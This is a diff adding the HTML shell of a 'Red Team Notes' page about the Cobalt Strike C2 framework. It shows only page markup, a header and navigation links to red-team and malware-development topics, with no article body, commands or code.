@@ -1,0 +1,2795 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Red Teamers and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs.">
+      
+      
+        <meta name="author" content="benjugat">
+      
+      
+        <link rel="canonical" href="https://benjugat.github.io/rtnotes/red-team/c2-cobaltstrike/">
+      
+      
+        <link rel="prev" href="../opsec-infrastructure/">
+      
+      
+        <link rel="next" href="../host-reconnaissance/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>C2 - Cobalt Strike - Red Team Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#installation" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Red Team Notes" class="md-header__button md-logo" aria-label="Red Team Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Red Team Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              C2 - Cobalt Strike
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Red Team Notes" class="md-nav__button md-logo" aria-label="Red Team Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    Red Team Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Red Team
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Red Team
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../opsec-infrastructure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OPSEC Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C2 - Cobalt Strike
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../host-reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Host Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../host-persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Host Persistence
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../host-privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Host Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lateral-movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../credentials-and-user-impersonation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credentials & User Impersonation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../playing-with-tokens/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Playing with Tokens
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kibana/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kibana - The Security App
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ms-sql-servers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MS SQL Servers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../data-protection-api/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Protection API (DPAPI)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../laps/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LAPS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../microsoft-defender/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Microsoft Defender Antivirus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../application-whitelisting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Application Whitelisting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Malware Development
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Malware Development
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Basics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/basics/tips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tips and Tricks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/basics/compilation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compilation and Checks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/basics/encrypting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Encrypting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/basics/data-stoarge/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Payload Storage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/basics/binary-entropy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Binary Entropy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/basics/binary-improvements/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Binary Improvements
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/basics/iat-parser/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IAT Parser
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Code Injection
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Code Injection
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/code-injection/intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/code-injection/section-views/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sections and Views
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/code-injection/dll-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DLL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/code-injection/APC-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    APC Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/code-injection/early-bird/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Early Bird (APC Calls)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/code-injection/srdi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shellcode Reflective DLL Injection (sRDI)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hooking
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hooking
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/hooking/detour/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Detour
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/hooking/iat-hooking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IAT Hooking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/hooking/appinit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AppInit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Low Priv Evasion
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Low Priv Evasion
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/lowpriv-evasion/call-obfuscation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Function Call Obfuscation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/lowpriv-evasion/ppid-spoofing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PPID Spoofing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Object Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Object Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/object-enumeration/processes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Process Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/object-enumeration/threads/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Thread Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/object-enumeration/modules/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware/object-enumeration/handle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Handle Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
